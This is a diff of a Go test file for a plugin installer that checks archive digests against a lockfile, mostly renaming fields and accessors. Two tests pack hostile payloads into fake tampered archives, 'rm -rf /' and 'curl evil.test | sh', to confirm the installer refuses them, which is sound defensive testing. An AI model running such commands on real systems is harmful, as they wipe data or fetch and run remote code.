@@ -39,8 +39,8 @@ func newScene(t *testing.T) *scene {
 
 	fake := newFakeGitHub(t, "jdoe", "lore-linear")
 	store := NewStore(t.TempDir())
-	asset := coord.AssetName(store.Platform())
-	archive := archiveWith(t, coord.binaryName(store.Platform()), []byte(stubBinary))
+	asset := coord.assetName(store.platform)
+	archive := archiveWith(t, coord.binaryName(store.platform), []byte(stubBinary))
 	fake.publish("v0.3.1", map[string][]byte{asset: archive})
 
 	return &scene{
@@ -89,16 +89,16 @@ func TestInstallPinsVerifiesAndCaches(t *testing.T) {
 	if !result.Pinned || result.Locked {
 		t.Fatalf("result pinned = %v, locked = %v; want a first install to pin", result.Pinned, result.Locked)
 	}
-	if want := digestOf(scene.archive); result.ArtifactDigest != want {
-		t.Fatalf("artifact digest = %q, want %q", result.ArtifactDigest, want)
+	if want := digestOf(scene.archive); result.LockedDigest != want {
+		t.Fatalf("artifact digest = %q, want %q", result.LockedDigest, want)
 	}
 
-	artifact, locked := lock.Artifact("linear", scene.store.Platform())
+	artifact, locked := lock.Artifact("linear", scene.store.platform)
 	if !locked {
-		t.Fatalf("nothing locked for %s: %+v", scene.store.Platform(), lock.Plugins)
+		t.Fatalf("nothing locked for %s: %+v", scene.store.platform.Key(), lock.Plugins)
 	}
-	if artifact.Digest != result.ArtifactDigest {
-		t.Fatalf("locked digest = %q, want %q", artifact.Digest, result.ArtifactDigest)
+	if artifact.Digest != result.LockedDigest {
+		t.Fatalf("locked digest = %q, want %q", artifact.Digest, result.LockedDigest)
 	}
 	if artifact.URL != scene.fake.downloadURL("v0.3.1", scene.asset) {
 		t.Fatalf("locked url = %q", artifact.URL)
@@ -106,7 +106,7 @@ func TestInstallPinsVerifiesAndCaches(t *testing.T) {
 
 	// The layout is load-bearing: versions live in separate directories so
 	// several may coexist, and the lockfile decides which one runs.
-	want := filepath.Join(scene.store.Root(), "plugins", "linear", "v0.3.1", scene.coord.binaryName(scene.store.Platform()))
+	want := filepath.Join(scene.store.root, "plugins", "linear", "v0.3.1", scene.coord.binaryName(scene.store.platform))
 	if result.Binary != want {
 		t.Fatalf("binary = %q, want %q", result.Binary, want)
 	}
@@ -117,7 +117,7 @@ func TestInstallPinsVerifiesAndCaches(t *testing.T) {
 		t.Fatalf("%s = %q, want %q", digestFileName, recorded, result.BinaryDigest)
 	}
 
-	path, err := scene.store.Binary("linear", scene.coord, lock)
+	path, err := scene.store.Binary(scene.coord, lock)
 	if err != nil {
 		t.Fatalf("locate the installed binary: %v", err)
 	}
@@ -132,7 +132,7 @@ func TestInstallRefusesATamperedArtifact(t *testing.T) {
 	t.Parallel()
 
 	scene := newScene(t)
-	scene.fake.tamper("v0.3.1", scene.asset, archiveWith(t, scene.coord.binaryName(scene.store.Platform()), []byte("rm -rf /\n")))
+	scene.fake.tamper("v0.3.1", scene.asset, archiveWith(t, scene.coord.binaryName(scene.store.platform), []byte("rm -rf /\n")))
 
 	lock := &Lock{}
 	_, err := scene.install(t, lock, false)
@@ -159,7 +159,7 @@ func TestInstallRefusesWhenTheLockedDigestNoLongerMatches(t *testing.T) {
 	lock, first := scene.installed(t)
 
 	// The publisher rewrites the release: new bytes, new checksums, same tag.
-	rewritten := archiveWith(t, scene.coord.binaryName(scene.store.Platform()), []byte("curl evil.test | sh\n"))
+	rewritten := archiveWith(t, scene.coord.binaryName(scene.store.platform), []byte("curl evil.test | sh\n"))
 	scene.fake.publish("v0.3.1", map[string][]byte{scene.asset: rewritten})
 
 	_, err := scene.install(t, lock, false)
@@ -169,14 +169,14 @@ func TestInstallRefusesWhenTheLockedDigestNoLongerMatches(t *testing.T) {
 	if !internalerror.IsPrecondition(err) {
 		t.Fatalf("kind = %v, want precondition", internalerror.KindOf(err))
 	}
-	for _, want := range []string{"digest mismatch", first.ArtifactDigest, digestOf(rewritten)} {
+	for _, want := range []string{"digest mismatch", first.LockedDigest, digestOf(rewritten)} {
 		if !strings.Contains(err.Error(), want) {
 			t.Fatalf("error %q does not mention %q", err, want)
 		}
 	}
 
-	artifact, _ := lock.Artifact("linear", scene.store.Platform())
-	if artifact.Digest != first.ArtifactDigest {
+	artifact, _ := lock.Artifact("linear", scene.store.platform)
+	if artifact.Digest != first.LockedDigest {
 		t.Fatalf("the refused install rewrote the pin to %q", artifact.Digest)
 	}
 }
@@ -208,19 +208,19 @@ func TestInstallUpdateRewritesTheLockedDigest(t *testing.T) {
 	scene := newScene(t)
 	lock, first := scene.installed(t)
 
-	next := archiveWith(t, scene.coord.binaryName(scene.store.Platform()), []byte("#!/bin/sh\necho v0.4.0\n"))
+	next := archiveWith(t, scene.coord.binaryName(scene.store.platform), []byte("#!/bin/sh\necho v0.4.0\n"))
 	moved, err := scene.coord.AtVersion("v0.4.0")
 	if err != nil {
 		t.Fatalf("move the coordinate: %v", err)
 	}
 	scene.coord = moved
-	scene.fake.publish("v0.4.0", map[string][]byte{moved.AssetName(scene.store.Platform()): next})
+	scene.fake.publish("v0.4.0", map[string][]byte{moved.assetName(scene.store.platform): next})
 
 	result, err := scene.install(t, lock, true)
 	if err != nil {
 		t.Fatalf("update: %v", err)
 	}
-	if result.ArtifactDigest == first.ArtifactDigest {
+	if result.LockedDigest == first.LockedDigest {
 		t.Fatal("update kept the old digest")
 	}
 
@@ -228,9 +228,9 @@ func TestInstallUpdateRewritesTheLockedDigest(t *testing.T) {
 	if entry.Version != "v0.4.0" || entry.From != "github.com/jdoe/lore-linear@v0.4.0" {
 		t.Fatalf("entry = %+v, want v0.4.0", entry)
 	}
-	artifact, _ := lock.Artifact("linear", scene.store.Platform())
-	if artifact.Digest != result.ArtifactDigest {
-		t.Fatalf("locked digest = %q, want %q", artifact.Digest, result.ArtifactDigest)
+	artifact, _ := lock.Artifact("linear", scene.store.platform)
+	if artifact.Digest != result.LockedDigest {
+		t.Fatalf("locked digest = %q, want %q", artifact.Digest, result.LockedDigest)
 	}
 
 	// Both versions coexist on disk; the lockfile is what decides which runs.
@@ -245,7 +245,8 @@ func TestInstallMissingAssetNamesWhatWasLookedForAndWhatExists(t *testing.T) {
 	t.Parallel()
 
 	scene := newScene(t)
-	store := scene.store.WithPlatform(Platform{OS: "plan9", Arch: "mips"})
+	store := NewStore(scene.store.root)
+	store.platform = Platform{OS: "plan9", Arch: "mips"}
 	installer := scene.fake.installer(store)
 
 	_, err := installer.Install(context.Background(), Request{Coordinate: scene.coord}, &Lock{})
@@ -404,7 +405,7 @@ func TestInstallURLCoordinatePinsTheFirstFetch(t *testing.T) {
 	}
 
 	store := NewStore(t.TempDir())
-	installer := &Installer{Store: store, HTTP: server.Client()}
+	installer := newInstaller(store, server.Client(), DefaultAPIBase())
 	lock := &Lock{}
 	result, err := installer.Install(context.Background(), Request{Coordinate: coord}, lock)
 	if err != nil {
@@ -445,7 +446,7 @@ func TestUnpackSkipsArchiveEntriesThatAreNotOneFileName(t *testing.T) {
 	}
 
 	// The skipped entry was the only executable, so the fallback picks nothing.
-	_, _, err = unpack(scene.coord, scene.store.Platform(), scene.asset, archive)
+	_, _, err = unpack(scene.coord, scene.store.platform, scene.asset, archive)
 	if err == nil {
 		t.Fatal("unpacking an archive whose only executable escapes the cache succeeded, want a refusal")
 	}
@@ -460,7 +461,7 @@ func TestUnpackTakesTheBinaryFromUnderADirectoryPrefix(t *testing.T) {
 	t.Parallel()
 
 	scene := newScene(t)
-	platform := scene.store.Platform()
+	platform := scene.store.platform
 	binaryName := scene.coord.binaryName(platform)
 	archive := tarGz(t,
 		tarEntry{name: "dist/README.md", mode: 0o644, body: []byte("# acme")},
@@ -830,7 +831,7 @@ func TestInstallOfAURLDerivedVersionCachesItUnderThatVersion(t *testing.T) {
 		t.Fatalf("install build-77: %v", err)
 	}
 
-	want := filepath.Join(scene.store.Root(), "plugins", "linear", "build-77", "linear")
+	want := filepath.Join(scene.store.root, "plugins", "linear", "build-77", "linear")
 	if result.Binary != want {
 		t.Fatalf("binary = %q, want %q", result.Binary, want)
 	}
@@ -838,7 +839,7 @@ func TestInstallOfAURLDerivedVersionCachesItUnderThatVersion(t *testing.T) {
 		t.Fatalf("installed binary = %q, want the archive's entry", installed)
 	}
 
-	located, err := scene.store.Binary("linear", coord, lock)
+	located, err := scene.store.Binary(coord, lock)
 	if err != nil {
 		t.Fatalf("locate build-77: %v", err)
 	}
